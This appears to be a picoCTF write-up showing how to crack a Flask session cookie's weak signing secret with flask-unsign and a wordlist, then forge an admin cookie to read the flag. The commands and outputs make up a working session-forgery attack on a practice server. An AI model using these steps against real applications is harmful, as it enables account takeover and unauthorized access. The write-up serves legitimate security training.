## Description
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! server.py http://mercury.picoctf.net:18835/

## Solution
It is a flask webpage that used flask cookie.

if we input `snickerdoodle` (as the placeholder suggested) we will get a cookie like below:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1790
Vary: Cookie
Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zege9g.RGIqqCZEVoQIruRNB3b3iV0JxTM; HttpOnly; Path=/
```

and if we check it with `jwt.io` will get below:
```
{'very_auth': 'snickerdoodle'}
```

Ok let's check `flask-unsign` package and see what usefull will find out by this tool.

```bash
flask-unsign --decode --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zege6g.O7dLVM6qjNHDklhceyxi9SuzI9w'
{'very_auth': 'snickerdoodle'}
```

Ok let's try to find the secret key by brute-force (i used rockyou.txt dictionary for it).
```bash
$ flask-unsign  --wordlist ../../../Resources/rockyou.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Zege6g.O7dLVM6qjNHDklhceyxi9SuzI9w' --no-literal-eval
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 6272 attempts
b'fortune'
```

we found the secret key: `fortune`.

Now let's try to encode a cookie for ourself:
```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'fortune'
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZegjpA.DW8Ah2ei1K5zDGEprl5-84jUxEE
```

and send this request with new cookie:
```
GET /display HTTP/1.1
Host: mercury.picoctf.net:18835
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: auth_name=TE1YOFZTSU0zYWh1VkpjYUVNQTdXVG01clZRbVplb0NWQWdSZ1hPNCsxRUhMQ3FQUEdWdEttaWhXbm1qbW1Ja3JDWVpLWW8vYVlMTVZsazVCZXlkWkpIZHhyMzRpMmFMTUQ2b1Q1dGtuQmQyeGZNQUlaNFpGaGwzdzc5MkM3TXQ=; name=18; PHPSESSID=j62q4iq5g1nosspa3vvp9puc14; session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZegjpA.DW8Ah2ei1K5zDGEprl5-84jUxEE
Upgrade-Insecure-Requests: 1
```
and will get the flag in response
